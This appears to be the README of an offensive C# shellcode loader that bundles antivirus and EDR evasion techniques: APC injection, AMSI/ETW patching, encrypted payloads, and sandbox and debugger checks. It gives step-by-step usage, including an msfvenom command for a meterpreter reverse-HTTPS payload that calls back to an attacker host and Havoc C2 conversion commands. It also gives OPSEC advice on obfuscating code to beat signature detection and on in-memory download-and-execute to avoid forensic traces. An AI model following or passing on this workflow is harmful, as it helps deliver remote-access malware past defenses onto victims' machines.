### C# ShellCode Loader 3
--------------------------------------
Shellcode loader (written in C#) that implements several antivirus bypass and defense evasion techniques.

#### FEATURES
  - Implements shellcode injection using Asynchronous Procedure Call (APC) and the NtTestAlert function
  - AMSI and ETW bypass (patching technique)
  - Shellcode encryption (AES-256 / CBC mode)
  - Basic sandbox detection & evasion
    - Terminates execution if the host Windows machine is not joined to a specific domain
    - Terminates execution if a debugger is detected (basic anti-debugging check)
  - Shellcode handling => the encrypted shellcode is Base64-encoded and loaded from a local file
  - Supports shellcodes generated by multiple Command-and-Control (C2) frameworks such as Metasploit and Havoc
    
#### USAGE
  - STEP 1. Generate a Csharp shellcode with your favorite C2 framework or generate a "raw" shellcode and then convert it to the Csharp format.
```
Examples
[*] METASPLOIT C2 Framework 
    $ msfvenom -p windows/x64/meterpreter_reverse_https EXITFUNC=thread HandlerSSLCert=/path/cert.pem LHOST=IP LPORT=port -a x64 -f csharp -o stageless-shellcode.bin

[*] HAVOC C2 Framework 
    Generate a new HAVOC payload with the format "Windows Shellcode" (Arch: x64; Indirect Syscall enabled; no sleep obfuscation; amsi/etw patching technique: hardware breakpoints)
    Then convert the raw shellcode to the Csharp format:
    > Manual option:
      @Kali:/$ xxd -p shellcode | tr -d '\n' | sed 's/.\{2\}/0x&,/g' > shellcode2
      @Kali:/$ sed '$ s/.$//' shellcode2 > shellcode3
   > Or use a tool like "SUPERNOVA" to convert it (SuperNova is a shellcode encryptor & obfuscator tool - https://github.com/nickvourd/Supernova)
``` 

  - STEP 2. Encrypt the shellcode using AES-256 encryption in CBC mode, then Base64-encode the encrypted output and save it to a file.
 ```
Examples
[*] AES encryption code - https://github.com/mvelazc0/defcon27_csharp_workshop/blob/master/Labs/lab4/3.cs
[*] Base64 encoding
    byte[] EncryptedShellcodeBytes = { ... };
    string Base64EncodedData = Convert.ToBase64String(EncryptedShellcodeBytes);
    Console.WriteLine(Base64EncodedData);
```
  - STEP 3. OPSEC requirements - Manually obfuscate the C# shellcode loader file
  	- Rename the namespace, classes, methods, and variables.
  	- Remove all existing comments and insert fake ones.
    - Remove all console output messages (i.e., Console.WriteLine("text")).
  	- Modify the code structure or logic slightly if needed to evade signature-based detection.

  - STEP 4. Compile the C# shellcode loader 
```  
[*] Example with "Developer PowerShell for VS 2022" - Microsoft (R) Visual C# Compiler
    Command: csc /t:exe /out:C:\path\Loader.exe C:\path\CsharpShellCodeLoader.cs
``` 
  - STEP 5. Optional Actions
  	- You may compress and obfuscate the shellcode loader executable using a packer such as ConfuserEx. However, this step is not strictly necessary to bypass most AV solutions if you performed sufficient manual obfuscation in Step 3.
  	- Alternatively, you may choose to remotely download and execute the C# binary in memory using PowerShell and reflection-based code loading. This approach avoids writing the binary to disk, enhancing stealth and reducing forensic traces.
  - STEP 6. Execution
```
[*] Command: loader.exe <domain name> <C:\filepath\base64-shellcode-file.txt> <AES key>
[*] Command: loader.exe lab.local C:\temp\base64-shellcode.txt superkey
    Note:
    > Argument 1 = The domain name of the target Windows machine. Used for sandbox detection/evasion by verifying domain membership.
    > Argument 2 = The file path to the AES-256 encrypted shellcode, which must be Base64-encoded (i.e., C:\path\file.txt or .\path\file.txt).
    > Argument 3 = The AES passkey used for encryption and decryption.
``` 
#### LICENSE
  - GNU General Public License v3.0
